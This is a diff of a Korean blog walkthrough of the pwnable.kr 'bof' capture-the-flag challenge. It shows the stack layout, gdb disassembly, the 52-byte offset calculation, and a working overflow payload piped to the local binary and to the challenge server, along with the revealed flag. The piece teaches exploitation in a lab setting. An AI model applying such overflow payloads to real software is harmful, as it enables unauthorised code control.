@@ -182,15 +182,18 @@ main함수를 보면, 우선 인자를 필요로 한다는 것을 확인 가능�
 
 차곡차곡이 중요하다. 선언 순서대로 쌓이므로 bof.c에서 func 함수로 들어가면, 여기의 stack은 이런 구조로 되어있을 것이다. 
 
-일단 파라미터로 들어오는 key(지역변수 취급되니까 얘도 변수임), 그리고 선언된 overflowme. 
+
+> 참고로 함수 stack에서 파라미터는 RET의 위에 들어옴!!
+
+
 
     (High address)
 
-    RET: 반환 주소값. 다음에 실행할 명령어가 위치한 메모리 주소값이 저장됨. 함수의 경우 return될 때 돌아갈 곳의 주소
-
-    SFP: stack 베이스 값. 스택 주소값 계산시 기준으로 쓰이는 프레임 포인트. 
-
     key
+
+    RET: 반환 주소값. 다음에 실행할 명령어가 위치한 메모리 주소값이 저장됨. 함수의 경우 return될 때 돌아갈 곳의 주소. 32bit기준 4byte.
+
+    SFP: stack 베이스 값. 스택 주소값 계산시 기준으로 쓰이는 프레임 포인트. 32bit기준 4byte.
 
     overflowme
 
@@ -204,13 +207,13 @@ main함수를 보면, 우선 인자를 필요로 한다는 것을 확인 가능�
 <br>
 <br>
 
-이제 위 구조도의 overflowme 위치를 보자. 우리가 조작하고싶은 key의 아래쪽이다. 
+이제 위 구조도의 overflowme 위치를 보자. key보다 밑에 있고, 얘는 위쪽으로 흘러넘칠 준비가 되어 있다. 
 
-그 말인즉슨 **overflowme에 배정된 공간 32byte를 넘게 뭘 넣으면 그게 흘러넘쳐 key까지 도달시킬 수 있다는 뜻**!! 
+그 말인즉슨 **overflowme를 이용해 key값을 조작할 수 있다는 뜻**!! 
 
-여기서 정확히 key 값을 원하는 값으로 덮기 위해서는 메모리상 두 변수들의 거리를 정확히 알아야 할 필요가 있다.
+이제 알아야 할 것은 overflowme와 key 사이의 거리이다. 
 
- 그 사이 거리만큼의 dummy값과 key를 엎을 원하는 값을 연속된 문자열로 overflowme에 넣어주면, 목적을 달성 할 수 있을 것이기 때문 
+RET나 SFP야 4byte로 정해져있다 해도, SFP와 overflowme 사이에 dummy 공간이 있을 수도 있기 때문이다. 
 
 
 
@@ -220,9 +223,9 @@ main함수를 보면, 우선 인자를 필요로 한다는 것을 확인 가능�
 <br>
 
 
-그러니! 일단 key와 overflowme 사이의 거리를 계산해보자. 
+그러니! 
 
-gdb를 이용해 어셈블리 영역을 확인한다면... 
+일단 gdb를 이용해 어셈블리 영역을 확인한다면... 
 
 
 main은 이렇게
@@ -242,16 +245,16 @@ func함수는 이렇게
 
 gets 함수가 call되는 지점이다.
 
-    0x00401478 <+24>:    call   0x403ad0 <gets>
+    0x56555649 <+29>:    lea    eax,[ebp-0x2c]
+    0x5655564c <+32>:    mov    DWORD PTR [esp],eax
+    0x5655564f <+35>:    call   0xf7e53ce0 <gets>
 
 
-
-이 시점에서 함수들의 리턴값이 저장된다는... eax에 들어간 값을 보자. 
-
-![infoReg](/img/02_infoReg.jpg)
+여기서 lea instuction이 array의 loading과 관련된 친구라고 한다.. 그니까 여기서 eax, 함수의 리턴값이 들어갈 주소 부분에 담겨지구있는... [ebp-0x2c] 요게 overflowme의 주소가 아닐까 한다. 
 
 
-gets함수의 리턴값, 즉 overflowme의 주소도 여기 저장된게 아닐까 라는 작은 소망을 품어보며 일단 킵. `0x61fee0`
+`ebp-0x2c` 킵!!
+
 
 <br>
 
@@ -259,88 +262,58 @@ gets함수의 리턴값, 즉 overflowme의 주소도 여기 저장된게 아닐�
 이건 key가 `0xcafebabe`와 비교되고있는 cmp문 부분이다. 
 
 
-    0x0040147d <+29>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+    0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
 
 
 첫번째 operand는 ebp+0x8, 두번째 operand는 어디서 많이 본 상수값이다. 
 
-그니까 ebp+0x8가 key가 아닐까 라는 작은 소망을 품어본다. 그럼 ebp값을 알아야겠다. 
+그니까 `ebp+0x8`가 key의 주소가 아닐까 하는 작은 소망을 품어본다. 킵!!
 
 
-레지스터들의 값을 확인해보자. 
-![infoReg](/img/02_infoReg.jpg)
 
-이 부분. 
+즉 overflowme와 key 사이의 거리는... 두 주소 다 ebp를 기준으로 움직이고 있으니,
 
-    ebp            0x61ff08 0x61ff08
+    (gdb) p/d 0x8 + 0x2c
+    $2 = 52
 
-`0x61ff08`라는 주소가 나왔다. 그럼 위의 instuction에서 key로 추정되는 주소는, 
-
-    (gdb) p/x 0x61ff08 + 0x8
-    $3 = 0x61ff10
+쨔잔 52바이트!! 
 
 
 <br>
+<hr>
 <br>
 
 그으러어며언... 
 
-아까 추정한 overflowme의 주소는 `0x61fee0`
-
-그리고 방금 추정한 key의 주소는 `0x61ff10`
-
-더 높은 주소에 있는 key에서 overflowme를 빼보자... 
-
-    (gdb) p/d 0x61ff10 - 0x61fee0
-    $3 = 48
-
-사이의 거리가 48이다!! 
 
 <br>
 
-
-그럼 48개의 dummy값과 key에 넣어줄....
+52개의 dummy값과 key에 넣어줄....
 little endian방식의 0xcafebabe를 페이로드로 짜보자. 
 
-0xcafebabe는 10진수로 3405691582이다. key에 int로 담길테니까. 
 
-
-    `python -c "print 'x'*48 + '\xbe\xba\xfe\xca'"`
+    `python -c "print 'x'*52 + '\xbe\xba\xfe\xca'"`
 
 
 
-그리고 이 친구를 oveflowme의 값으로 넣어줘 보자... 
+대충 이렇게 생겼을건데, 인자가 아니라 표준입력값으로 넣어줘야 하니 형식을 조금 변환. 
 
 
-    (python -c "print 'x'*48 + '\xbe\xba\xfe\xca'";cat) | ./bof
 
-    (python -c "print 'x'*48 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+    (python -c "print 'x'*52 + '\xbe\xba\xfe\xca'";cat) | ./bof
 
-왱ㅏㄴ대............. 
+와 된다~ 
 
-왜안대냑구.... 
-
-<br>
+근데 일케해바야 내 쉘이 실행되니, 서버쪽에 넣어보자. 
 
 
-window 이슈인가 싶어서 리눅스환경에서도 해봤다. 
+
+    (python -c "print 'x'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
 
 
 
 
 
-
-    ┌[ccsss☮4664a647eaaa]-(~/aaa)
-    └> ./bof
-    overflow me : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx¾ºþÊ
-    Nah..
-    *** stack smashing detected ***: terminated
-    [1]    408 abort      ./bof
-
-
-에라이 안되네 
-
-임의로 컴파일링 한 게 문제인 듯...
 <br>
 <br>
 
@@ -351,11 +324,11 @@ window 이슈인가 싶어서 리눅스환경에서도 해봤다.
 
 
 
-![none-success]()
+![success](/img/02_flag.jpg)
 
 <br>
 
-    DOUMM.....
+    daddy, I just pwned a buFFer :)
 
 
 
@@ -364,7 +337,8 @@ window 이슈인가 싶어서 리눅스환경에서도 해봤다.
 <br>
 
 
-ㅜ-ㅠ
+
+:)
 
 
 
